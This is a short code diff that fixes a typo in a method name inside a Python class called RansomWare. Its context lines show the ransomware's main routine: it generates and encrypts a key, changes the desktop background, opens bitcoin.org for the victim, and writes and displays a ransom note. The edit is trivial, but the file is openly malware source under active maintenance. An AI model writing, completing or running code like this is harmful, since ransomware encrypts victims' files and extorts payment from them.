@@ -129,7 +129,7 @@ class RansomWare:
 
 
     @staticmethod
-    def what_is_bitcion():
+    def what_is_bitcoin():
         url = 'https://bitcoin.org'
         # Open browser to the https://bitcoin.org so they know what bitcoin is
         webbrowser.open(url)
@@ -237,7 +237,7 @@ def main():
     rw.write_key()
     rw.encrypt_fernet_key()
     rw.change_desktop_background()
-    rw.what_is_bitcion()
+    rw.what_is_bitcoin()
     rw.ransom_note()
 
     t1 = threading.Thread(target=rw.show_ransom_note)
